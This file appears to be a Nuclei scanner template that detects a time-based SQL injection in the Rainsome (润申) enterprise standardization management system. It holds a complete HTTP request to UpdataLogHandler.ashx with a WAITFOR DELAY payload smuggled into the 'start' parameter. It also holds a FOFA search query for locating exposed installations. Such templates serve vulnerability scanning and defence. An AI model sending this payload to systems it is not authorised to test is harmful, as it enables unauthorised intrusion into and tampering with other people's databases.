id: rainsome-UpdataLogHandler-sqli

info:
  name: 润申企业标准化管理系统 updataloghandler - sqli
  author: msk
  severity: high
  metadata:
    verified:
    fofa-qeury: body="企业标准化管理系统" && icon_hash="-185925207"
  tags: rainsome,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /PDCA/ashx/UpdataLogHandler.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 80
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        action=GetAll&start=' WAITFOR DELAY '0:0:6'--&end=&code=11&type=2&page=1&rows=20

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,"total")
          - duration >= 5 && duration < 9
        condition: and